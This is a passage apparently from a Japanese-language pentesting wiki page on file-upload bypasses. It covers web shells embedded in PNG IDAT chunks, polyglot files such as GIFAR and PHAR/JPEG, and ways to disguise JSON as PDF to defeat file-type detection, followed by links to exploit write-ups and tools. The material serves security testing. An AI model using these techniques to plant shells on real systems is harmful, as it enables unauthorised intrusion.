PNGファイルのIDATチャンクにPHP Shellを埋め込むことで、特定の画像処理を効果的にバイパスできます。PHP-GDの`imagecopyresized`と`imagecopyresampled`関数は、この文脈で特に関連があり、それぞれ画像のリサイズとリサンプリングに一般的に使用されます。埋め込まれたPHP Shellがこれらの操作で影響を受けないという性質は、特定のユースケースで大きな利点となります。

この手法の詳細（方法論や応用可能性を含む）は、次の記事に詳しく説明されています: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。このリソースはプロセスとその意味合いを包括的に理解するための参考になります。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot filesは、同時に複数のファイル形式として有効に存在できるカメレオンのようなユニークなツールです。興味深い例としては、GIFとRARの両方として機能するハイブリッドである[GIFAR](https://en.wikipedia.org/wiki/Gifar)があります。こうしたファイルはこの組み合わせに限定されず、GIFとJSやPPTとJSのような組み合わせも可能です。

polyglot filesの主な有用性は、ファイルタイプに基づいてファイルをスクリーニングするセキュリティ対策を回避できる点にあります。多くのアプリケーションでは、潜在的に危険な形式（例: JS、PHP、Phar）によるリスクを軽減するために、JPEG、GIF、DOCのような特定のファイルタイプのみをアップロード許可することが一般的です。しかし、polyglotは複数のファイルタイプの構造的要件を満たすことで、これらの制限をこっそりバイパスできます。

ただし、適応力がある一方でpolyglotには制約もあります。例えば、polyglotがPHARファイル（PHp ARchive）とJPEGの両方を同時に兼ねる場合でも、アップロードが成功するかはプラットフォームのファイル拡張子ポリシーに依存することがあります。システムが許可される拡張子に厳格であれば、polyglotの構造的二面性だけではアップロードの保証にはならない可能性があります。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDFのように見せかけて有効なJSONをアップロードする方法

許可されていない場合でも、PDFファイルを偽装して有効なJSONをアップロードすることでファイルタイプ検出を回避する方法（テクニックは **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** より）:

- **`mmmagic` library**: `%PDF` のマジックバイトが最初の1024バイト内にあれば有効と判定されます（記事の例を参照してください）
- **`pdflib` library**: JSONのフィールド内に偽のPDFフォーマットを追加して、ライブラリにPDFだと誤認させます（記事の例を参照してください）
- **`file` binary**: ファイルから最大1048576バイトを読み取ることができます。これより大きなJSONを作成してcontentを解析できないようにし、そのJSONの中に実際のPDFの先頭部分を入れれば、PDFだと判断されます

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
